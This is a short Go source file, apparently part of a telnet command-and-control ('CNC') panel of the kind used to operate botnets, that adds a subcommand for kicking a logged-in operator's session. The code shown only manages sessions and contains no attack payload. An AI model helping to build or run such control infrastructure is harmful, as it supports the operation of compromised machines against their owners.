package subcommands

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"errors"
	"strconv"
)

func init() {
	command.Subcommand("users", &command.SubCommand{
		Aliases:   []string{"kick"},
		Arguments: []command.Argument{{"username", false}},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session, parent *command.Command) error {
			s := sessions.Retrieve(args[0])
			if s == nil {
				return session.CmdError(errors.New("user has no session open"))
			}

			s.Remove()

			if err := s.Conn.Close(); err != nil {
				return err
			}

			return session.Println(config.Green, "Successfully kicked ", strconv.Quote(args[0]), ".")
		},
	})
}
